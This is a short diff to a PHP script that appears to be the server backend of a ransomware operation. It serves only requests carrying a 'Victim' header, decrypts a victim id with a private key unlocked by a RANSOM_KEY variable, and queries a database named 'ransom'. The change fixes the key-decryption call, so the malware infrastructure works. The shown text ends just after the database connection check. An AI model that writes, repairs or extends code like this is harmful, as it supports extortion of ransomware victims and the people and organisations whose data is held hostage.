@@ -1,11 +1,11 @@
 <?php
 	if( isset($_GET['id']) && ($_SERVER['HTTP_VICTIM'])){
-		$id = $_GET['id'];
-		
+		$tmp = $_GET['id'];
+		$id = str_replace('-','+',$tmp);
 		$private_key = file_get_contents("private.pem");
-    		$res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));
-    		openssl_private_decrypt(base64_decode($id),$dec,$id);
-    		$id = $dec;
+    	$res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));
+    	openssl_private_decrypt(base64_decode($id),$dec,$res);
+    	$id = $dec;
 
 		$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
 		if(!$dbconn){
